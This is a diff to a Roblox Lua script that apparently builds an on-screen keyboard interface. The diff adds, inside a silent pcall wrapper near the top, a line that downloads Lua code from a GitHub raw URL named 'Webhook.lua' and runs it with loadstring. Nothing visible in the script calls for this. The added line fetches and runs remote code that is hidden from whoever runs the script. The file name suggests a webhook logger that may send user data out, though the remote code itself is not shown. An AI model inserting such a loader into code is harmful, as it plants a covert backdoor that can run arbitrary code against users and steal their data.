@@ -6,6 +6,9 @@ local Players = game:GetService("Players")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local plr = Players.LocalPlayer
 local playerGui = plr:WaitForChild("PlayerGui")
+pcall(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/StarFIow/Scripts/main/Utility/Webhook.lua"))()
+end)
 
 local Keyboard = Instance.new("ScreenGui")
 Keyboard.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
